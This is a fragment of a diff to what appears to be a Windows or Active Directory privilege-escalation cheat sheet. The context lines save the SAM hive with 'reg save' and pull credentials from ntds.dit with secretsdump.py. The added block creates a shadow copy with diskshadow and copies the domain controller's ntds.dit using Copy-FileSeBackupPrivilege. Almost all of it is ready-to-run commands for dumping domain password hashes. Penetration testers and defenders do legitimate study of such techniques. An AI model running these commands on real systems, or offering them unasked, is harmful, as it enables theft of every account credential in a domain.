@@ -238,6 +238,13 @@ reg save HKLM\SAM SAM.SAV
 # Step 4: Extract credentials (on Kali)
 secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
 ```
+```cmd
+# Step 1: Automatics
+diskshadow /s vss.dsh
+
+# Step 2: Copy the ntds file
+Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\Users\Public\ntds.dit
+```
 
 ### Event Log Readers
 
